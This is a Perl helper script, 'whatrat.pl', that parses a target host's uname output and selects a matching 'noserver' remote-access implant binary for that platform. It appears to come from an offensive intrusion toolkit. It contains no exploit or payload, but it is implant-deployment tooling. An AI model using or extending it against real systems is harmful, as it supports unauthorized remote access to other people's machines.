#!/bin/env perl
$version = "1.0.0.7";
if ("@ARGV" eq "-v") {
  die "whatrat.pl v. $version\n";
}
foreach ("../etc/autoutils",
	 "/current/etc/autoutils",
	 "autoutils") {
  if (-r $_) {
    require $_ or die "Could not require $_\n";
    last;
  }
}
my $debug=0;
$debug = $ENV{"DEBUG"};
mydbg("DEBUG IS ON: $debug") if $debug;

my $ratdir = "/current/up/morerats";
opendir(DIR,$ratdir) or
  die "Cannot use $0 unless /current/up/morerats contains noservers\n";
chdir($ratdir);
my $nopenver="";
foreach $file ( grep { /^noserver-/ } sort readdir DIR ){
  next unless -f $file or -l $file;
  next unless $file =~ /noserver-(\d+\.\d+\.\d+\.\d+)-/;
  my $thisver=$1;
  $nopenver=$thisver if ((verval($nopenver))[1] < (verval($thisver))[1]);
  push(@noservers,$file);
}
closedir(DIR);
($nopenver) = $nopenver =~ /^(\d+\.\d+\.\d+)/;
mydbg("Got noservers=(\n".join("\n",@noservers)."\n)\n\n".
      "with nopenver=$nopenver");
@noservers = findmatch($nopenver);
my @input=();
if (@ARGV and ! -e $ARGV[0]) {
  @input=("@ARGV");
} else {
  @input=<>;
}

mydbg("input=(@input)");
while ($line = shift @input) {
    ($os, $name, $osver,@restofuname) = split(/\s+/,$line);
mydbg("noservers=(@noservers)\n\nos=$os name=$name osver=$osver restofuname=$restofuname");
    $osver =~ s/[^\d\.-]//g;
    $osver =~ s/-+$//;
    $osver =~ s/^\.+//;
    $os = lc $os;
    $osver =~ s/^5\./2./ if ($os eq "sunos"); # use 2.* naming convention
    $name = lc $name;
    $osver = lc $osver;
    chomp($restofuname = lc "@restofuname");
    mydbg("rou=$restofuname=");
    $platform = "i.*86" if $restofuname =~ /(i[3456]86)/;
    $platform = "sparc" if $restofuname =~ /(sparc|sun4)/;
    $platform = "alpha" if ($restofuname =~ /alpha/i and
			    $os =~ /osf/i);
    if ($restofuname =~ /(junos)/i) {
      $platform = "freebsd";
      $osver = "4.5";
    }
    next unless ($os and $name and $osver and $restofuname) ;

    # We keep whittling away at @noservers, once we are down to one
    # entry, findmatch will print it then exit. If findmatch() returns,
    # we still have more than one.
    @noservers = findmatch($os);
    @noservers = findmatch($osver);
    @noservers = findmatch($platform);
mydbg("noservers=(@noservers)\n\nos=$os name=$name osver=$osver restofuname=$restofuname");
    if ($os eq "linux") {
      if ($restofuname =~ /redflag/) {
	@noservers = findmatch("redflag");
      } else {
	@noservers = findmatch("redflag",1);
      }
      # At this point, we pick our known link of 586 or 686 and be done with it.
      if ($restofuname =~ /686/) {
	done("noserver-$nopenver-i686.pc.linux.gnu");
      } elsif ($restofuname =~ /586/) {
	done("noserver-$nopenver-i586.pc.linux.gnu");
      } else {
	done("noserver-$nopenver-i586.pc.linux.gnu");
      }
    } elsif ($os eq "sunos") {
      @noservers = findmatch("$osver.*$platform");
      @noservers = findmatch("$platform.*$osver");
      @noservers = findmatch("sun");
      if ($restofuname =~ /i386/) { # got an intel
	@noservers = findmatch("386");
      } elsif ( $restofuname =~ /sparc/ ) {
	@noservers = findmatch("sparc");
	$bailnow = "Damn. Got SUNOS but don't know what the release is.";
	$colorbail = $colorfail ;
	last;
      } elsif (1) {
	$bailnow = "Not supported yet: $os $name $osver @restofuname" ;
	$colorbail = $colorfail ;
      }
      # If we are this far, remove any remaining linux to be safe
      @noservers = findmatch("linux",1);
    } elsif ($os eq "freebsd") {
      mydbg("osver=$osver");
      # If we are this far, remove any remaining linux to be safe
      @noservers = findmatch("linux",1);
    } elsif ($os eq "irix") {
      if ($osver eq "6.5" or $osver eq "6.4" or $osver eq "6.3" or 
	  $osver eq "5.3") {
	$ratlocalname = "$ratdir/noserver-${nopenver}-mips.sgi.irix-$osver" ;
      }
      # If we are this far, remove any remaining linux to be safe
      @noservers = findmatch("linux",1);
    } elsif ($os eq "osf1") {
      if ($osver eq "v4.0" or ( $restofuname =~ /alpha/i )) {
	$ratlocalname = "$ratdir/noserver-${nopenver}-alphaev6.dec.osf4.0f" ;
      }
      # If we are this far, remove any remaining linux to be safe
      @noservers = findmatch("linux",1);
    } else {
      mydbg( "Don't see uname output there",$colorfail) ;
      next;
    }
    mydbg("We have uname output we can handle.",$colorgren);
}
# Our last hope, if matches thus far are identical md5sums, we
# eliminate one of them with uniqify().
@noservers=(uniqify(@noservers));
my $best = greatestnot("$osver");
dbg("MULTIPLE NOPEN MATCHES...first is best i think\n");
print "$ratdir/$best\n" if $best;
foreach (grep { ! /$best/ } @noservers) {
#foreach (@noservers) {
  print "$ratdir/$_\n";
}
if (@ARGV) {
  die "whatrat.pl v. $version cannot determine RAT from \"@ARGV\"\n";
}

sub progprint {
  local ($str,$color,@stuff) = @_ ;
  return if $quiet ;
  $STD="STDERR" ; # took this out
  my $oldfh = select ($STD) ;
  my $scripme = $ENV{EXPLOIT_SCRIPME} ;
  $| = 1 ;
  print "$colornote";
  print STDOUT "$colornote" if $scripme ;
  if ($color == (1)) {
    print "\r[$prog: $str]        ";
    print STDOUT "\r[$prog: $str]        " if $scripme ;
  } elsif (! $str) {
    print "$colornorm\n";
    print STDOUT "$colornorm\n" if $scripme ;
  } else {
    $color = $colornote unless ($color);
    print "${color}[$prog: $str]\n$colornorm";
    print STDOUT "${color}[$prog: $str]\n$colornorm" if $scripme ;
  }
  select $oldfh ;
} # end sub progprint
sub mydbg {
  return unless $debug;
  warn "@_\n";
}
sub done {
  print "$ratdir/@_\n";
  exit 0;
}

sub findmatch {
  # global @noservers
  local ($str,$negate) = (@_);
  my @matches = ();
  unless ($negate) {
    return @noservers unless @matches = grep { /$str/ } @noservers;
  } else {
    @matches = grep { !/$str/ } @noservers;
    return @noservers unless @matches;
  }
  done(@matches) if @matches == 1;
mydbg("findmatch returning (@matches)");
  return @matches;
}
sub greatestnot {
  # Given a platform version string, assuming @noservers strings end
  # in platform version, run findmatch(which) where which is the 
  # greatest platform we have that is no greater than our uname $osver.
  # global @noservers
  local ($str) = (@_);
  my ($which,$ver,$greatest) = ();
  foreach (@noservers) {
    my $verval = 0;
    my ($newver) = /([\d\.-]+)$/;
    $newver =~ s/[-\.]+$//g;
    $newver =~ s/^[-\.]+//g;
    my $newverval = (verval($newver))[1];
mydbg("given osver=$str Got ver=$ver so far  newver=$newver for $_");
    if ($newverval > $verval and $newverval <= (verval($str))[1]) {
      $ver = $newver;
      $verval = (verval($verval))[1];
      $which=$_;
    }
  }
mydbg("Got ver=$ver which=$which");
#  findmatch($which);or this one???
  @noservers = findmatch($ver);
  return $which;
#  @noservers = grep { ! /$which/ } @noservers;
}
sub sumof {
  local ($file) = (@_);
  return "" unless -l $file or -f _;
  chomp(my $ans = `md5sum $file 2>/dev/null`);
  $ans =~ s/\s.*//g;
  return $ans;
}
sub uniqify {
  local (@files) = (@_);
  my @returnval=();
  my %alreadygot=();
  foreach my $file (@files) {
    push (@returnval,$file) unless
      $alreadygot{sumof($file)}++;
  }
  done("@returnval") if @returnval==1;
  return @returnval;
}
